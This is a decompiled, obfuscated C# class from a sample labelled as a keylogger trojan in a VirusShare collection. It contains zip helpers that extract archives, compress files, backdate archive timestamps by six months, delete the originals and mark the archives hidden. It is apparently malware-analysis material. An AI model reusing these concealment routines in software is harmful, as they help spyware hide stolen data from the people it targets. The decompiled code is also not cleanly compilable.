// Decompiled with JetBrains decompiler
// Type: ᡔ
// Assembly: dskl, Version=1.71.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5380AAD3-568D-45D6-B9BC-59CE5C1E3490
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan-Spy.MSIL.KeyLogger.czk-cde7546df369e926f201a20ea21a174728391b0927412058c56dcdd5367e606c.exe

using ICSharpCode.SharpZipLib.Zip;
using ICSharpCode.SharpZipLib.Zip.Compression.Streams;
using System;
using System.IO;

internal class ᡔ
{
  public static void ᡚ(
    string zipPathAndFile,
    string outputFolder,
    string password,
    bool deleteZipFile)
  {
    do
      ;
    while (false);
    try
    {
      ZipInputStream zipInputStream = new ZipInputStream((Stream) File.OpenRead(zipPathAndFile));
      if (password != null && password != string.Empty)
        zipInputStream.Password = password;
      string empty = string.Empty;
      ZipEntry nextEntry;
      while ((nextEntry = zipInputStream.GetNextEntry()) != null)
      {
        string path1 = outputFolder;
        string fileName = Path.GetFileName(nextEntry.Name);
        if (path1 != "")
          Directory.CreateDirectory(path1);
        if (fileName != string.Empty && nextEntry.Name.IndexOf(".ini") < 0)
        {
          string path2 = (path1 + "\\" + nextEntry.Name).Replace("\\ ", "\\");
          string directoryName = Path.GetDirectoryName(path2);
          if (!Directory.Exists(directoryName))
            Directory.CreateDirectory(directoryName);
          FileStream fileStream = File.Create(path2);
          byte[] buffer = new byte[2048];
          while (true)
          {
            int count = ((Stream) zipInputStream).Read(buffer, 0, buffer.Length);
            if (count > 0)
              fileStream.Write(buffer, 0, count);
            else
              break;
          }
          fileStream.Close();
        }
      }
      ((Stream) zipInputStream).Close();
      if (deleteZipFile)
        File.Delete(zipPathAndFile);
    }
    catch
    {
    }
    int num1;
    int num2;
    while (num1 == num2)
    {
      num2 = 1;
      int num3 = num2;
      int num4 = num1;
      num1 = num3;
      if (num1 > num4)
        break;
    }
  }

  public static void ᡖ(string fin)
  {
    do
      ;
    while (false);
    try
    {
      using (ZipOutputStream zipOutputStream = new ZipOutputStream((Stream) File.Create(fin + ".zip")))
      {
        zipOutputStream.SetLevel(9);
        byte[] buffer = new byte[4096];
        zipOutputStream.PutNextEntry(new ZipEntry(Path.GetFileName(fin))
        {
          DateTime = DateTime.Now
        });
        using (FileStream fileStream = File.OpenRead(fin))
        {
          int count;
          do
          {
            count = fileStream.Read(buffer, 0, buffer.Length);
            ((Stream) zipOutputStream).Write(buffer, 0, count);
          }
          while (count > 0);
        }
        ((DeflaterOutputStream) zipOutputStream).Finish();
        ((Stream) zipOutputStream).Close();
      }
    }
    catch
    {
    }
    int num1;
    int num2;
    while (num1 == num2)
    {
      num2 = 1;
      int num3 = num2;
      int num4 = num1;
      num1 = num3;
      if (num1 > num4)
        break;
    }
  }

  public static void ᡀ(string fin)
  {
    do
      ;
    while (false);
    try
    {
      string path = fin + ".zip";
      using (ZipOutputStream zipOutputStream = new ZipOutputStream((Stream) File.Create(path)))
      {
        zipOutputStream.SetLevel(9);
        byte[] buffer = new byte[4096];
        zipOutputStream.PutNextEntry(new ZipEntry(Path.GetFileName(fin))
        {
          DateTime = DateTime.Now.AddMonths(-6)
        });
        using (FileStream fileStream = File.OpenRead(fin))
        {
          int count;
          do
          {
            count = fileStream.Read(buffer, 0, buffer.Length);
            ((Stream) zipOutputStream).Write(buffer, 0, count);
          }
          while (count > 0);
        }
        ((DeflaterOutputStream) zipOutputStream).Finish();
        ((Stream) zipOutputStream).Close();
      }
      if (File.Exists(fin))
        File.Delete(fin);
      if (File.Exists(path))
        File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);
    }
    catch
    {
    }
    int num1;
    int num2;
    while (num1 == num2)
    {
      num2 = 1;
      int num3 = num2;
      int num4 = num1;
      num1 = num3;
      if (num1 > num4)
        break;
    }
  }

  public ᡔ()
  {
    do
      ;
    while (false);
    // ISSUE: explicit constructor call
    base.\u002Ector();
  }
}
